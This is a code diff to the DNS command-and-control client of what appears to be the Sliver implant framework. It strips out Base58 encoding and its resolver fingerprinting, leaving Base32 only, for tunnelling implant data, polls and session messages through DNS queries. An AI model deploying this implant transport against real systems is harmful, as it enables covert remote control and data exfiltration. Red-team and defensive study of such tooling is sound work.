@@ -37,17 +37,6 @@ package dnsclient
 		Stop = 4 bytes max
 		Size = 4 bytes max
 		Data = 78 - (2+4+4+4+4) ~= 60 bytes per query worst case
-
-	*** BASE58 ***
-	Base58 ~2% less efficient than Base64, but we can't use all 64 chars in DNS so
-	it's just not an option, we could potentially use some type of Base62 encoding
-	but those implementations are more complex and only marginally more efficient
-	than Base58, and Base58 avoids any complexities with '-' in domain names.
-
-	The idea is that since the server returns the messages CRC32 checksum we can detect
-	when the message is transparently corrupted by some rude resolver. So when we init
-	the session we send a few messages with random data to see if we can use Base58, and
-	fallback to Base32 if we detect problems.
 */
 
 // {{if .Config.IncludeDNS}}
@@ -102,7 +91,6 @@ type DNSOptions struct {
 	RetryCount         int
 	MaxErrors          int
 	WorkersPerResolver int
-	ForceBase32        bool
 	NoTXT              bool
 	ForceResolvConf    string
 	ForceResolvers     string
@@ -142,7 +130,6 @@ func ParseDNSOptions(c2URI *url.URL) *DNSOptions {
 		RetryCount:         retryCount,
 		MaxErrors:          maxErrors,
 		WorkersPerResolver: workersPerResolver,
-		ForceBase32:        strings.ToLower(c2URI.Query().Get("force-base32")) == "true",
 		NoTXT:              strings.ToLower(c2URI.Query().Get("notxt")) == "true",
 		ForceResolvConf:    c2URI.Query().Get("force-resolv-conf"),
 		ForceResolvers:     c2URI.Query().Get("resolvers"),
@@ -169,7 +156,6 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 	return &SliverDNSClient{
 		metadata:        map[string]*ResolverMetadata{},
 		parent:          parent,
-		forceBase32:     opts.ForceBase32,
 		noTXT:           opts.NoTXT,
 		forceResolvConf: opts.ForceResolvConf,
 		forceResolvers:  opts.ForceResolvers,
@@ -181,7 +167,6 @@ func NewDNSClient(parent string, opts *DNSOptions) *SliverDNSClient {
 		WorkersPerResolver: opts.WorkersPerResolver,
 		subdataSpace:       254 - len(parent) - (1 + (254-len(parent))/64),
 		base32:             encoders.Base32Encoder{},
-		base58:             encoders.Base58Encoder{},
 	}
 }
 
@@ -195,7 +180,6 @@ type SliverDNSClient struct {
 	retryWait       time.Duration
 	retryCount      int
 	queryTimeout    time.Duration
-	forceBase32     bool
 	noTXT           bool
 	forceResolvConf string
 	forceResolvers  string
@@ -211,9 +195,6 @@ type SliverDNSClient struct {
 	WorkersPerResolver int
 
 	base32 encoders.Base32Encoder
-	base58 encoders.Base58Encoder
-
-	enableCaseSensitiveEncoder bool
 }
 
 // DNSWork - Single unit of work for DNSWorker
@@ -278,10 +259,9 @@ func (w *DNSWorker) Start(id int, recvQueue <-chan *DNSWork, sendQueue <-chan *D
 
 // ResolverMetadata - Metadata for the resolver
 type ResolverMetadata struct {
-	Address      string
-	EnableBase58 bool
-	Metrics      []time.Duration
-	Errors       int
+	Address string
+	Metrics []time.Duration
+	Errors  int
 }
 
 // SessionInit - Initialize DNS session
@@ -328,19 +308,13 @@ func (s *SliverDNSClient) SessionInit() error {
 		// {{end}}
 		return err
 	}
-	resolver, meta := s.randomResolver()
-	var encoder encoders.Encoder
-	if meta.EnableBase58 {
-		encoder = s.base58
-	} else {
-		encoder = s.base32
-	}
+	resolver, _ := s.randomResolver()
 	initMsg := &dnspb.DNSMessage{
 		ID:   s.nextMsgID(),
 		Type: dnspb.DNSMessageType_INIT,
 		Size: uint32(len(initData)),
 	}
-	respData, err := s.sendInit(resolver, encoder, initMsg, initData)
+	respData, err := s.sendInit(resolver, s.base32, initMsg, initData)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("[dns] init msg send failure %v", err)
@@ -460,8 +434,8 @@ func (s *SliverDNSClient) ReadEnvelope() (*pb.Envelope, error) {
 	log.Printf("[dns] read envelope ...")
 	// {{end}}
 
-	resolver, meta := s.randomResolver()
-	pollMsg, err := s.pollMsg(meta)
+	resolver, _ := s.randomResolver()
+	pollMsg, err := s.pollMsg()
 	if err != nil {
 		return nil, err
 	}
@@ -561,19 +535,13 @@ func (s *SliverDNSClient) CloseSession() error {
 
 // parallelSend - send a full message to teh server
 func (s *SliverDNSClient) parallelSend(data []byte) error {
-	var encoder encoders.Encoder
-	if s.enableCaseSensitiveEncoder {
-		encoder = s.base58
-	} else {
-		encoder = s.base32
-	}
 	msg := &dnspb.DNSMessage{
 		Type: dnspb.DNSMessageType_DATA_FROM_IMPLANT,
 		ID:   s.nextMsgID(),
 		Size: uint32(len(data)),
 	}
 
-	domains, err := s.SplitBuffer(msg, encoder, data)
+	domains, err := s.SplitBuffer(msg, s.base32, data)
 	if err != nil {
 		return err
 	}
@@ -889,7 +857,7 @@ func (s *SliverDNSClient) joinSubdataToParent(subdata string) (string, error) {
 	return domain, nil
 }
 
-func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
+func (s *SliverDNSClient) pollMsg() (string, error) {
 	nonceBuf := make([]byte, 8)
 	rand.Read(nonceBuf)
 	pollMsg, _ := proto.Marshal(&dnspb.DNSMessage{
@@ -897,13 +865,8 @@ func (s *SliverDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
 		Type: dnspb.DNSMessageType_POLL,
 		Data: nonceBuf,
 	})
-	if s.enableCaseSensitiveEncoder {
-		msg, _ := s.base58.Encode(pollMsg)
-		return string(msg), nil
-	} else {
-		msg, _ := s.base32.Encode(pollMsg)
-		return string(msg), nil
-	}
+	msg, _ := s.base32.Encode(pollMsg)
+	return string(msg), nil
 }
 
 func (s *SliverDNSClient) clearMsg(msgId uint32) (string, error) {
@@ -914,13 +877,8 @@ func (s *SliverDNSClient) clearMsg(msgId uint32) (string, error) {
 		Type: dnspb.DNSMessageType_CLEAR,
 		Data: nonceBuf,
 	})
-	if s.enableCaseSensitiveEncoder {
-		msg, _ := s.base58.Encode(clearMsg)
-		return string(msg), nil
-	} else {
-		msg, _ := s.base32.Encode(clearMsg)
-		return string(msg), nil
-	}
+	msg, _ := s.base32.Encode(clearMsg)
+	return string(msg), nil
 }
 
 func (s *SliverDNSClient) otpMsg() (string, error) {
@@ -936,7 +894,7 @@ func (s *SliverDNSClient) otpMsg() (string, error) {
 	return string(msg), nil
 }
 
-// fingerprintResolver - Fingerprints resolve to determine if we can use a case sensitive encoding
+// fingerprintResolver - Fingerprints resolve to validate base32 transport.
 func (s *SliverDNSClient) fingerprintResolvers() {
 	wg := &sync.WaitGroup{}
 	// {{if .Config.Debug}}
@@ -960,15 +918,14 @@ func (s *SliverDNSClient) fingerprintResolvers() {
 
 	// {{if .Config.Debug}}
 	for _, result := range s.metadata {
-		log.Printf("[dns] %s: avg rtt %s, base58: %v, errors %d",
-			result.Address, s.averageRtt(result), result.EnableBase58, result.Errors)
+		log.Printf("[dns] %s: avg rtt %s, errors %d",
+			result.Address, s.averageRtt(result), result.Errors)
 	}
 	// {{end}}
 
 	// NOTE: In the future we may want to add a configurable error threshold for now
 	// if we encounter any errors we don't use the resolver.
 	workingResolvers := []DNSResolver{}
-	allSupportBase58 := true
 	for _, resolver := range s.resolvers {
 		meta := s.metadata[resolver.Address()]
 		if 0 < meta.Errors {
@@ -977,41 +934,24 @@ func (s *SliverDNSClient) fingerprintResolvers() {
 			// {{end}}
 			continue
 		}
-		if !meta.EnableBase58 {
-			allSupportBase58 = false
-		}
 		workingResolvers = append(workingResolvers, resolver)
-	}
-	if allSupportBase58 && !s.forceBase32 {
-		s.enableCaseSensitiveEncoder = true
 	}
 	s.resolvers = workingResolvers
 }
 
-// Fingerprints a single resolver to determine if we can use a case sensitive encoding, average
-// round trip time, and if it works at all
+// Fingerprints a single resolver to measure RTT and validate base32 transport.
 func (s *SliverDNSClient) fingerprintResolver(id int, wg *sync.WaitGroup, results chan<- *ResolverMetadata, resolver DNSResolver) {
 	defer wg.Done()
 	meta := &ResolverMetadata{
-		Address:      resolver.Address(),
-		EnableBase58: false,
-		Metrics:      []time.Duration{},
-		Errors:       0,
+		Address: resolver.Address(),
+		Metrics: []time.Duration{},
+		Errors:  0,
 	}
-	s.benchmark(id, s.base32, resolver, meta)
-	if meta.Errors == 0 && !s.forceBase32 {
-		s.benchmark(id, s.base58, resolver, meta)
-		if meta.Errors == 0 {
-			meta.EnableBase58 = true
-		} else {
-			meta.EnableBase58 = false
-			meta.Errors = 0 // Reset base32 error count
-		}
-	}
+	s.benchmark(id, resolver, meta)
 	results <- meta
 }
 
-func (s *SliverDNSClient) benchmark(id int, encoder encoders.Encoder, resolver DNSResolver, meta *ResolverMetadata) {
+func (s *SliverDNSClient) benchmark(id int, resolver DNSResolver, meta *ResolverMetadata) {
 	for index := 0; index < metricsMaxSize/2; index++ {
 		finger, fingerChecksum, err := s.fingerprintMsg(id)
 		if err != nil {
@@ -1021,7 +961,7 @@ func (s *SliverDNSClient) benchmark(id int, encoder encoders.Encoder, resolver D
 			// {{end}}
 			continue
 		}
-		encodedValue, _ := encoder.Encode(finger)
+		encodedValue, _ := s.base32.Encode(finger)
 		domain, err := s.joinSubdataToParent(string(encodedValue))
 		if err != nil {
 			meta.Errors++
